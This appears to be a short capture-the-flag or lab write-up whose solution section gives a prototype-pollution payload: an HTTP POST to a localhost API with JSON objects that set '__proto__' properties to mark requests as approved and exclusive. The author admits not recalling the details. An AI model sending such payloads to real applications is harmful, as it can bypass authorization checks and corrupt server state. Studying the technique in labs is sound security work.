# Objective

# Solution

The solution has to do with prototype polution.. I can't recall specifics, but check out the queries:

```
POST http://localhost:3000/api/createObjects HTTP/1.1
Content-Type: application/json

[
  {
    "approved": "true",
    "__proto__": {
      "approved": "true",
      "type": "exclusive"
    }
  },
  {
    "joe": "blow",
    "__proto__": {
      "type": "exclusive"
    }
  },
  {
    "jane": "crane"
  }
]
```
